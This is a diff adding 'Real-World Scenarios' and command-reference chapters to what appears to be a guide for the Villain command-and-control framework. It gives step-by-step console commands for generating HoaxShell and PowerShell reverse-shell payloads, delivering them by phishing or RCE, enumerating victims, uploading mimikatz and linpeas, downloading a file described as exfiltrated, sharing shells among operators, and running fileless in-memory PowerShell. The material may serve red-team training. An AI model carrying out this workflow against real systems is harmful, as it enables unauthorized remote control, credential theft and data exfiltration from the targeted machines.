@@ -387,6 +387,122 @@ tail -f /var/log/villain.log
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Quick Engagement Workflow
+
+```bash
+# 1. Start Villain
+sudo villain
+
+# 2. Generate HTTPS HoaxShell payload
+Villain > generate
+# Select: HoaxShell (HTTPS)
+# Copy the generated payload
+
+# 3. Deliver payload (e.g., via phishing or RCE)
+# On target: paste and execute the PowerShell payload
+
+# 4. Interact with session
+Villain > sessions
+Villain > shell <session_id>
+
+# 5. Enumerate
+Villain (session: <id>) > whoami
+Villain (session: <id>) > hostname
+Villain (session: <id>) > ipconfig /all
+Villain (session: <id>) > net user
+Villain (session: <id>) > net localgroup administrators
+
+# 6. Transfer tools
+Villain (session: <id>) > upload /tmp/linpeas.exe C:\temp\linpeas.exe
+```
+
+### Team Engagement with Sibling Servers
+
+```bash
+# Operator 1 (Team Lead)
+sudo villain -p 6501
+# Generate payload and share with team
+
+# Operator 2 (Secondary)
+sudo villain -p 6502
+# Connect to team lead's server
+Villain > sibling 192.168.1.100 6501
+
+# Share shells between operators
+Villain > share <session_id> 192.168.1.101
+```
+
+### ConPtyShell for Fully Interactive Windows Shell
+
+```bash
+# Generate a PowerShell reverse shell payload
+Villain > generate
+# Select: Reverse TCP (PowerShell)
+
+# When the shell connects, Villain automatically invokes ConPtyShell
+# This provides a fully interactive Windows shell with:
+# - Tab completion
+# - Arrow key navigation
+# - Ctrl+C support
+# - Proper terminal emulation
+
+# Test the interactivity
+Villain (session: <id>) > powershell
+PS C:\Users\target> Get-Process
+PS C:\Users\target> cd C:\Windows
+PS C:\Windows> dir
+```
+
+### File Smuggler for Payload Delivery
+
+```bash
+# Upload a file to the target
+Villain (session: <id>) > upload /tmp/mimikatz.exe C:\temp\mimikatz.exe
+
+# Download exfiltrated data
+Villain (session: <id>) > download C:\Users\target\Documents\secrets.docx /tmp/secrets.docx
+
+# Use the File Smuggler HTTP server
+# The File Smuggler runs on port 8888 by default
+# Access files at http://VILLAIN_IP:8888/
+```
+
+---
+
+## Chapter 10: Command Reference
+
+### Console Commands
+
+| Command | Description |
+|---|---|
+| `generate` | Generate a new payload |
+| `sessions` | List all active sessions |
+| `shell <id>` | Interact with a session |
+| `background` | Background the current session |
+| `sibling <ip> <port>` | Connect to a sibling server |
+| `share <id> <ip>` | Share a session with a sibling |
+| `shared_sessions` | View shared sessions |
+| `session_defender on/off` | Toggle Session Defender |
+| `sysinfo` | Get target system info |
+
+### Shell Commands (Inside a Session)
+
+| Command | Description |
+|---|---|
+| `whoami` | Current user context |
+| `hostname` | Target hostname |
+| `ipconfig` | Network configuration |
+| `upload <local> <remote>` | Upload file to target |
+| `download <remote> <local>` | Download file from target |
+| `ls <path>` | List directory contents |
+| `fileless_ps <script>` | Execute PowerShell in memory |
+| `sysinfo` | System information |
+| `background` | Return to main console |
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/t3l3machus/Villain
@@ -395,4 +511,5 @@ tail -f /var/log/villain.log
 - **HoaxShell:** https://github.com/t3l3machus/hoaxshell
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
 - **MITRE ATT&CK - Application Layer Protocol:** https://attack.mitre.org/techniques/T1071/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
 - **Related Tools:** HoaxShell, Netcat, Metasploit Framework
